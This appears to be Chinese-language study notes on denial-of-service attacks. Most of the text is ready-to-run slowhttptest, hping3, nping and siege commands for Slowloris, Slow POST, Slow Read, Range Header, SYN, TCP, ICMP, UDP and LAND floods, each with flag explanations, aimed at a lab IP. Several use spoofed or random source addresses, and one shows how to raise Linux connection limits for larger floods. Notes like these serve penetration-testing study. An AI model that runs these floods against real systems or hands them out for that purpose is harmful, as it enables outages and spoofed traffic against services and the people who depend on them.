应用层DoS

  • 应用服务漏洞
    • 服务代码存在漏洞，遇异常提交数据时程序崩溃，小流量导致程序/系统崩溃
    • 应用处理大量并发请求能力有限，被拒绝的是应用或OS
  • 缓冲区溢出漏洞
    • 向目标函数随机提交数据，特定情况下数据覆盖临近寄存器或内存
    • 影响：远程代码执行、DoS
    • 利用模糊测试方法发现缓冲区溢出漏洞

第一次执行的时候windwos主机并没有什么影响，多执行几次之后windwos主机就会被强制重启，达到DoS攻击

Slowhttptest

  • Slowhttptest

    • 源自google代码托管（那时还没有github托管）

    • 低带宽应用层慢速DoS攻击（相对于CC等快速攻击而言的慢速）

    • 最早由Python编写，跨平台支持（Linux、win、Cygwin、OSX）

    • 尤其擅长攻击apache、tomcat

  • 攻击方法

    • Slowloris和Slow HTTP POST攻击
      • 耗尽应用的并发连接池，类似于Http层的Syn flood
      • HTTP协议默认在服务器全部接收请求之后才开始处理，若客户端发送速度缓慢或不完整，服务器时钟为其保留连接资源池占用，此类大量并发将导致DoS
      • Slowloris：完整的http请求结尾是\r\n\r\n，攻击发一个\r\n……，让服务器继续等着
      • Slow POST：HTTP头content-length声明长度，但body部分(数据段)缓慢发送
    • Slow Read attack攻击
    • 与slowloris and slow POST目的相同，都是耗尽应用的并发连接池
    • 不同之处在于请求正常请求，但慢速读取想用数据
    • 攻击者调整TCP window窗口大小，使服务器慢速返回数据
    • Apache Range Header attack
    • 客户端传输大文件时，体积超过HTTP Body大小限制时进行分段
    • 耗尽服务器CPU、内存资源

  • 支持代理

    • 大量应用服务器和安全设备都无法防护慢速攻击

Slowloris Attack

  • slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u http://192.168.216.167 -x 24 -p 3 -l 9999

-c：建立1000个连接

-H：Slowloris Attack

-g -o：结果输出成my_header_stats文件

-i：间隔时间

-r：速率

-u：指定目标url

-x：每个随机值或名称的最大长度

-p：3s不响应表示服务器挂掉

-l：指定连接时间

在服务端查看已经建立了大量的连接

Slow POST Attack

  • slowhttptest -c 3000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVER -u http://192.168.216.167 -x 10 -p 3

Range Header Attack

  • slowhttptest -R -u http://192.168.216.167 -t HEAD -c 1000 -a 10 -b 3000 -r 500

Range Header攻击方式被优化了，无论发起多大的连接数只要连接服务器就立马关闭连接

Slow Read Attack

  • slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://192.168.216.167 -p 3

配置最大并发攻击

  • ulimite -n max_value

slowhttptest最大并发连接数为65539个，而默认Linux最大产生的并发数是1024，这时就需要使用ulimite -n 70000修改Linux系统的并发连接数，使其支持slowhttptest最大的的连接数

Hping3实现DoS

几乎可以定制发送任何TCP/IP数据包，用于测试FW、端口扫描、性能测试

Syn Flood攻击

  • hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source <目标IP>

-c：产生多少连接

-d：发送数据包的数据段是多大，指定的字节越大，发送时就会分包，达到大流量的效果

-S：发送TCP的SYN包

-w：TCP头window窗口大小，默认64

-flood：以泛洪的方式发送

–rand-source：随机伪造源地址

利用Hping3半开连接的方式会产生大量伪造的源地址，但同时自身资源也是非常的消耗

  • hping3 -c 10 -d 120 -S -P -U -p 80 -d 10000 --flood --rand-source 192.168.216.167

-P：TCP包中flags标记位的Push，发送数据

-U：TCP包中flags标记位的Urgent

TCP Flood攻击

  • hping3 -SARFUP -p 80 --flood --rand-source 192.168.216.167

-SARFUP：TCP的所有flags位

ICMP Flood攻击

  • hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood <目标IP>

-q：安静模式，不显示攻击结果

-n：不解析域名

-a：伪造源地址

–icmp：icmp方式flood

-d：ping包的数据部分

UDP Flood攻击

  • hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 192.168.216.167

LAND攻击

特殊种类的SYN Flood攻击

源地址。目的地址都是受害者，受害者于自己完成三次握手

  • hping3 -a 192.168.216.167 -S -d 100 -p 80 --flood 192.168.216.167

nping实现DoS

nping包含在nmap中的子命令

TCP全连接DoS攻击

  • nping --tcp-connect --rate=10000 -c 1000 -q 192.168.216.167

–rate=10000：一次建立10000个连接

查公网IP

nping --echo-client "public" echo.nmap.org --udp
nping --echo-client "public" echo.nmap.org --tcp -p1-1024 --flags ack

通过发送udp包并且传输public字段到echo.nmap.org域名上，就会返回公网IP

Siege

http/https 压力测试工具，模拟多个用户并发访问请求

基本用法

  • siege -i -c 1000 http://192.168.216.167 -A httttttp

-i：internet方式

-c：产生连接数

-A：http头，不使用-A参数默认使用siege头

调用字典

同时攻击多个url，使用 -f 调用字典文件

将目标url加入字典文件即可

路径：/etc/siege/urls.txt

  • siege -i -c 1000 -vv # 默认调用字典文件
